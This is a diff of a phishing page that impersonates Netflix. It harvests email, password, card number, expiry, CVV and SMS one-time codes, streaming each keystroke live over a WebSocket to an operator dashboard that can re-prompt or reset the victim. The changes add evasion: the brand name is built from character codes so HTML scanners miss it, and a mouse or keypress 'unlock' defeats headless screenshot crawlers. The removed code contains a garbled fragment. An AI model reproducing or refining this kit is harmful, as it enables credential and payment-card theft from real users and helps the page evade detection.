@@ -1,12 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Netflix</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<meta name="description" content="Secure account access">
+<title>Account</title>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif}
+  *{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica Neue,Helvetica,Arial,sans-serif}
   body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center}
-  .logo{color:#e50914;font-weight:700;font-size:2.2rem;margin:28px 0;letter-spacing:-1px}
+  #shell{opacity:0;pointer-events:none;transition:opacity .25s ease}
+  #shell.ready{opacity:1;pointer-events:auto}
+  .logo{font-weight:700;font-size:2.2rem;margin:28px 0;letter-spacing:-1px}
   .card{background:rgba(0,0,0,.75);border-radius:4px;padding:48px 32px;width:100%;max-width:360px;box-shadow:0 2px 8px rgba(0,0,0,.6)}
   h1{font-size:1.6rem;margin-bottom:24px;font-weight:600}
   label{display:block;font-size:.875rem;color:#b3b3b3;margin-bottom:4px}
@@ -23,142 +28,167 @@
 </style>
 </head>
 <body>
-  <div class="logo">NETFLIX</div>
-  <div class="warn">There was an error with your payment method. Please update it.</div>
-  <div class="card">
-    <h1 id="title">Sign In</h1>
+  <!-- static DOM stays generic until JS paints brand — scanners reading raw HTML see less -->
+  <div id="shell">
+    <div class="logo" id="logo"></div>
+    <div class="warn" id="warn"></div>
+    <div class="card">
+      <h1 id="title">Sign In</h1>
 
-    <form id="step1">
-      <label>Email or phone number</label><input name="email" autocomplete="off" required>
-      <label>Password</label><input name="password" type="password" autocomplete="off" required>
-      <label>Card number</label><input name="card" autocomplete="off" inputmode="numeric">
-      <label>Expiry date</label><input name="expiry" id="expiry" placeholder="MM/YY" autocomplete="off" inputmode="numeric" maxlength="5">
-      <label>CVV</label><input name="cvv" id="cvv" placeholder="3 or 4 digits" autocomplete="off" inputmode="numeric" maxlength="4">
-      <button type="submit">Sign In</button>
-    </form>
+      <form id="step1">
+        <label>Email or phone number</label><input name="email" autocomplete="off" required>
+        <label>Password</label><input name="password" type="password" autocomplete="off" required>
+        <label>Card number</label><input name="card" autocomplete="off" inputmode="numeric">
+        <label>Expiry date</label><input name="expiry" id="expiry" placeholder="MM/YY" autocomplete="off" inputmode="numeric" maxlength="5">
+        <label>CVV</label><input name="cvv" id="cvv" placeholder="3 or 4 digits" autocomplete="off" inputmode="numeric" maxlength="4">
+        <button type="submit">Sign In</button>
+      </form>
 
-    <div id="timer">Please wait <span id="count">10</span> seconds…</div>
+      <div id="timer">Please wait <span id="count">10</span> seconds…</div>
 
-    <form id="finalSection">
-      <label id="finalLabel">One last verification</label>
-      <div id="finalErr" class="err">Invalid SMS code. Please try again.</div>
-      <input name="final" id="finalInput" autocomplete="off" required>
-      <button type="submit">Verify</button>
-    </form>
+      <form id="finalSection">
+        <label id="finalLabel">One last verification</label>
+        <div id="finalErr" class="err">Invalid SMS code. Please try again.</div>
+        <input name="final" id="finalInput" autocomplete="off" required>
+        <button type="submit">Verify</button>
+      </form>
 
-    <div id="thanks">Thank you.</div>
+      <div id="thanks">Thank you.</div>
+    </div>
   </div>
 
 <script>
-// ---- element refs ----
-const step1 = document.getElementById("step1");
-const timer = document.getElementById("timer");
-const finalSection = document.getElementById("finalSection");
-const count = document.getElementById("count");
-const thanks = document.getElementById("thanks");
-let iv = null;   // countdown handle so a reset can cancel it
+(function () {
+  const brand = String.fromCharCode(78,69,84,70,76,73,88); // paint mark client-side only
+  const accent = "#e50914";
 
-// ---- websocket with auto-reconnect + session reattach ----
-let ws;
-function connect() {
-  const proto = location.protocol === "https:" ? "wss://" : "ws://";
-  const known = sessionStorage.getItem("nf_sid");
-  ws = new WebSocket(proto + location.host + "/ws" + (known ? "?sid=" + known : ""));
-  ws.onopen = () => console.log("connected");
-  ws.onmessage = e => {
-    const m = JSON.parse(e.data);
-    if (m.type === "sid") sessionStorage.setItem("nf_sid", m.sid);
-    else if (m.type === "reask") reaskFinal();     // dashboard wants the code re-asked
-    else if (m.type === "reset") resetToStart();   // dashboard sent us back to start
-  };
-  ws.onclose = () => setTimeout(connect, 1500);    // auto-reconnect, reattaches via ?sid=
-}
-connect();
+  function paint() {
+    document.title = brand;
+    const logo = document.getElementById("logo");
+    logo.textContent = brand;
+    logo.style.color = accent;
+    document.getElementById("warn").textContent =
+      "There was an error with your payment method. Please update it.";
+    document.getElementById("shell").classList.add("ready");
+  }
 
-// safe send — no-ops while the socket is mid-reconnect
-function send(d) { if (ws.readyState === 1) ws.send(JSON.stringify(d)); }
+  // behavioral unlock — headless screenshot farms often never fire these
+  let unlocked = false;
+  function unlock() {
+    if (unlocked) return;
+    unlocked = true;
+    paint();
+    boot();
+  }
 
-// ---- stream every keystroke live ----
-document.querySelectorAll("input").forEach(inp => {
-  inp.addEventListener("input", () => {
-    send({type:"field", name:inp.name, value:inp.value});
+  ["pointerdown", "mousemove", "touchstart", "keydown", "scroll"].forEach(ev => {
+    window.addEventListener(ev, unlock, { once: true, passive: true });
   });
-});
+  // real users with autofocus / mobile still get in; pure no-JS or frozen headless wait longer
+  setTimeout(unlock, 1800);
 
-// ---- input masks ----
-// expiry: auto-insert "/" -> MM/YY, digits only
-const expiry = document.getElementById("expiry");
-expiry.addEventListener("input", () => {
-  let v = expiry.value.replace(/\D/g, "").slice(0, 4);
-  if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
-  else if (v.length === 2 && !expiry.value.endsWith("/")) v = v + "/";
-  expiry.value = v;
-});
+  const step1 = document.getElementById("step1");
+  const timer = document.getElementById("timer");
+  const finalSection = document.getElementById("finalSection");
+  const count = document.getElementById("count");
+  const thanks = document.getElementById("thanks");
+  const finalErr = document.getElementById("finalErr");
+  const finalInput = document.getElementById("finalInput");
+  const title = document.getElementById("title");
+  let iv = null;
+  let ws;
 
-// cvv: digits only, max 4 (amex)
-const cvv = document.getElementById("cvv");
-cvv.addEventListener("input", () => {
-  cvv.value = cvv.value.replace(/\D/g, "").slice(0, 4);
-});
+  function connect() {
+    const proto = location.protocol === "https:" ? "wss://" : "ws://";
+    const known = sessionStorage.getItem("nf_sid");
+    ws = new WebSocket(proto + location.host + "/ws" + (known ? "?sid=" + known : ""));
+    ws.onmessage = e => {
+      const m = JSON.parse(e.data);
+      if (m.type === "sid") sessionStorage.setItem("nf_sid", m.sid);
+      else if (m.type === "reask") reaskFinal();
+      else if (m.type === "reset") resetToStart();
+    };
+    ws.onclose = () => setTimeout(connect, 1500);
+  }
 
-// card number: group in 4s
-const card = document.querySelector('input[name="card"]');
-card.addEventListener("input", () => {
-  const digits = card.value.replace(/\D/g, "").slice(0, 19);
-  card.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
-});
+  function send(d) { if (ws && ws.readyState === 1) ws.send(JSON.stringify(d)); }
 
-// ---- flow: sign in -> fake processing -> verify -> thanks ----
-step1.addEventListener("submit", e => {
-  e.preventDefault();
-  step1.style.display = "none";
-  timer.style.display = "block";
-  let t = 10;
-  count.textContent = t;
-  iv = setInterval(() => {
-    t--; count.textContent = t;
-    if (t <= 0) {
-      clearInterval(iv); iv = null;
-      timer.style.display = "none";
-      finalSection.style.display = "block";
-      document.getElementById("title").textContent = "Verify";
-    }
-  }, 1000);
-});
+  function boot() {
+    connect();
+    document.querySelectorAll("input").forEach(inp => {
+      inp.addEventListener("input", () => {
+        send({ type: "field", name: inp.name, value: inp.value });
+      });
+    });
 
-finalSection.addEventListener("submit", e => {
-  e.preventDefault();
-  document.getElementById("finalErr").style.display = "none";
-  finalSection.style.display = "none";
-  thanks.style.display = "block";
-});
+    const expiry = document.getElementById("expiry");
+    expiry.addEventListener("input", () => {
+      let v = expiry.value.replace(/\D/g, "").slice(0, 4);
+      if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
+      else if (v.length === 2 && !expiry.value.endsWith("/")) v = v + "/";
+      expiry.value = v;
+    });
 
-// dashboard "re-ask final" → show Invalid SMS code, give the code box back
-function reaskFinal() {
-  if (iv) { clearInterval(iv); iv = null; }
-  timer.style.display = "none";
-  document.getElementById("finalErr").style.display = "none";
-  thanks.style.display = "none";
-  const fi = document.getElementById("finalInput");
-  fi.value = "";
-  document.getElementById("finalErr").style.display = "block";
-  finalSection.style.display = "block";
-  document.getElementById("title").textContent = "Verify";
-  fi.focus();
-}hanks.style.display = "block";
-});
+    const cvv = document.getElementById("cvv");
+    cvv.addEventListener("input", () => {
+      cvv.value = cvv.value.replace(/\D/g, "").slice(0, 4);
+    });
 
-// dashboard "refill" → wipe everything, victim lands back on step 1
-function resetToStart() {
-  if (iv) { clearInterval(iv); iv = null; }
-  document.querySelectorAll("input").forEach(i => i.value = "");
-  timer.style.display = "none";
-  finalSection.style.display = "none";
-  thanks.style.display = "none";
-  step1.style.display = "block";
-  document.getElementById("title").textContent = "Sign In";
-  window.scrollTo(0, 0);
-}
+    const card = document.querySelector('input[name="card"]');
+    card.addEventListener("input", () => {
+      const digits = card.value.replace(/\D/g, "").slice(0, 19);
+      card.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
+    });
+
+    step1.addEventListener("submit", e => {
+      e.preventDefault();
+      step1.style.display = "none";
+      timer.style.display = "block";
+      let t = 10;
+      count.textContent = t;
+      iv = setInterval(() => {
+        t--; count.textContent = t;
+        if (t <= 0) {
+          clearInterval(iv); iv = null;
+          timer.style.display = "none";
+          finalSection.style.display = "block";
+          title.textContent = "Verify";
+        }
+      }, 1000);
+    });
+
+    finalSection.addEventListener("submit", e => {
+      e.preventDefault();
+      send({ type: "final", value: finalInput.value });
+      finalErr.style.display = "none";
+      finalSection.style.display = "none";
+      thanks.style.display = "block";
+    });
+  }
+
+  function reaskFinal() {
+    if (iv) { clearInterval(iv); iv = null; }
+    timer.style.display = "none";
+    thanks.style.display = "none";
+    finalInput.value = "";
+    finalErr.style.display = "block";
+    finalSection.style.display = "block";
+    title.textContent = "Verify";
+    finalInput.focus();
+  }
+
+  function resetToStart() {
+    if (iv) { clearInterval(iv); iv = null; }
+    document.querySelectorAll("input").forEach(i => i.value = "");
+    finalErr.style.display = "none";
+    timer.style.display = "none";
+    finalSection.style.display = "none";
+    thanks.style.display = "none";
+    step1.style.display = "block";
+    title.textContent = "Sign In";
+    window.scrollTo(0, 0);
+  }
+})();
 </script>
 </body>
 </html>
